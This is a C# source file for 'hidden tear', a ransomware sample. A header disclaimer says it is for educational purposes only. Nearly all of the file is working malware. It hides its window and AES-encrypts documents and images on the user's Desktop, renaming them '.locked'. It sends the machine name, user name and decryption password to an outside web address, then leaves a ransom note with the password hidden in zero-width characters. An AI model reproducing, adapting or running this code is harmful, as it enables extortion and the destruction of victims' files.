﻿/*
 _     _     _     _              _
| |   (_)   | |   | |            | |
| |__  _  __| | __| | ___ _ __   | |_ ___  __ _ _ __
| '_ \| |/ _` |/ _` |/ _ \ '_ \  | __/ _ \/ _` | '__|
| | | | | (_| | (_| |  __/ | | | | ||  __/ (_| | |
|_| |_|_|\__,_|\__,_|\___|_| |_|  \__\___|\__,_|_|

 * Coded by Utku Sen(Jani) / August 2015 Istanbul / utkusen.com
 * hidden tear may be used only for Educational Purposes. Do not use it as a ransomware!
 * You could go to jail on obstruction of justice charges just for running hidden tear, even though you are innocent.
 *
 * Ve durdu saatler
 * Susuyor seni zaman
 * Sesin dondu kulagimda
 * Dedi uykudan uyan
 *
 * Yine boyle bir aksamdi
 * Sen guluyordun ya gozlerimin icine
 * Feslegenler boy vermisti
 * Gokten parlak bir yildiz dustu pesine
 * Sakladim gozyaslarimi
 */

using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Security;
using System.Security.Cryptography;
using System.IO;
using System.Net;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;


namespace hidden_tear
{
    public partial class Form1 : Form
    {
        //Url to send encryption password and computer info
        string targetURL = "http://www.utkusen.com/hidden-tear/write.php?info=";
        string userName = Environment.UserName;
        string computerName = System.Environment.MachineName.ToString();
        string userDir = "C:\\Users\\";
		string password;
        int sendControl = 0;



        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Opacity = 0;
            this.ShowInTaskbar = false;
            //starts encryption at form load
            startAction();

        }

        private void Form_Shown(object sender, EventArgs e)
        {
            Visible = false;
            Opacity = 100;
        }

        //AES encryption algorithm
        public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
        {
            byte[] encryptedBytes = null;
            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;

                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);

                    AES.Mode = CipherMode.CBC;

                    using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                        cs.Close();
                    }
                    encryptedBytes = ms.ToArray();
                }
            }

            return encryptedBytes;
        }

        //creates random password for encryption
        public string CreatePassword(int length)
        {
            const string valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/";
            StringBuilder res = new StringBuilder();
            Random rnd = new Random();
            while (0 < length--){
                res.Append(valid[rnd.Next(valid.Length)]);
            }
            return res.ToString();
        }

        //Sends created password target location
        public void SendPassword(string password){

            string info = computerName + "-" + userName + " " + password;
            var fullUrl = targetURL + info;
            var conent = new System.Net.WebClient().DownloadString(fullUrl);
        }

        //Encrypts single file
        public void EncryptFile(string file, string password)
        {

            byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
            byte[] passwordBytes = Encoding.UTF8.GetBytes(password);

            // Hash the password with SHA256
            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

            byte[] bytesEncrypted = AES_Encrypt(bytesToBeEncrypted, passwordBytes);

            File.WriteAllBytes(file, bytesEncrypted);
            System.IO.File.Move(file, file+".locked");

            passwordBytes = null;


        }

        //encrypts target directory
        public void encryptDirectory(string location)
        {
            password = CreatePassword(15);
            //extensions to be encrypt
            var validExtensions = new[]
            {
                ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd"
            };

            string[] files = Directory.GetFiles(location);
            string[] childDirectories = Directory.GetDirectories(location);
            for (int i = 0; i < files.Length; i++){
                string extension = Path.GetExtension(files[i]);
                if (validExtensions.Contains(extension))
                {
                    EncryptFile(files[i],password);
                }
            }
            for (int i = 0; i < childDirectories.Length; i++){
                encryptDirectory(childDirectories[i]);
            }
            if (sendControl == 0)
            {

                SendPassword(password);
                sendControl++;
            }
        }

        public void startAction()
        {

            string path = "\\Desktop";
            string startPath = userDir + userName + path;
            encryptDirectory(startPath);
            messageCreator();
			password = null;
			System.Windows.Forms.Application.Exit();
        }

        public void messageCreator()
        {
            string path = "\\Desktop\\READ_IT.txt";
            string fullpath = userDir + userName + path;
	        char bin0 = '\u200B'; // ZERO WIDTH SPACE
	        char bin1 = '\u180E'; // MONGOLIAN VOWEL SEPARATOR
            string[] lines = { "Files has been encrypted with hidden tear", "Send me some bitcoins or kebab", "And I also hate night clubs, desserts, being drunk.", "" };
	        string NSA_KEY = "";
			for (int x = 0;x < password.Length;x++) {
				string bin = Convert.ToString(password[x], 2);
				for (int i = 0;i < 8;i++)
					NSA_KEY += bin[i] == '1' ? bin1 : bin0;
			}
	        lines[lines.Length - 1] = NSA_KEY;
			System.IO.File.WriteAllLines(fullpath, lines);
        }
    }
}
